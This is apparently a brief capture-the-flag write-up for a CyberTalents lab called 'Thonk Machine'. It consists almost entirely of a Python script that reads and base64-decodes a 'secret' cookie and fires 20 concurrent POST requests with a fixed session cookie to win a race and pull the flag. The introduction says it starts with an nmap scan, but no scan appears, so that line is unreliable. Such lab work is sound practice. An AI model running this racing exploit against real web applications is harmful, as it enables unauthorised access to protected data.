---
layout: "post"
Date: 2024-03-24
title: "Thonk Machine Cybertalents"
---

We can start with nmap scan with command

`
import asyncio
import httpx
import requests
import time
import base64

burp0_url = "http://wcamxwl32pue3e6m5l3n94wbq36o873okkxmswvy-web.cybertalentslabs.com/index.php"
burp0_headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "en-EG,en;q=0.9,ar-EG;q=0.8,ar;q=0.7,en-GB;q=0.6,en-US;q=0.5,fr;q=0.4", "Connection": "close"}
Cookie = {"PHPSESSID":"554v5ia2g6ujp6a0o9hask0nv1"}

async def use_code(client):
    resp1 = await client.get(f'{burp0_url}')
    print("Response 1:", resp1)  # Check the response object
    secret_recv = resp1.cookies.get("secret")
    print("Secret received:", secret_recv)  # Check the secret received
    if secret_recv:
        secret = base64.b64decode(requests.utils.unquote(secret_recv)).decode()
        print("Decoded secret:", secret)  # Check the decoded secret
        data = {"Q": f"{secret}"}
        resp2 = await client.post(f'{burp0_url}', headers=burp0_headers , data=data, cookies=Cookie)
        print("Response 2:", resp2)  # Check the response object for the second request
        if "flag{" in resp2.text:
            print("Flag Founded")
        return resp2.text
    else:
        print("Secret not received")
        return None, None


async def main():
    async with httpx.AsyncClient() as client:
        tasks = []
        for _ in range(20): #20 times
            tasks.append(asyncio.ensure_future(use_code(client)))
        
        # Get responses
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        # Print results
        for r in results:
            print(r)
        
        # Async2sync sleep
        await asyncio.sleep(0.5)
    print(results)

asyncio.run(main())
`
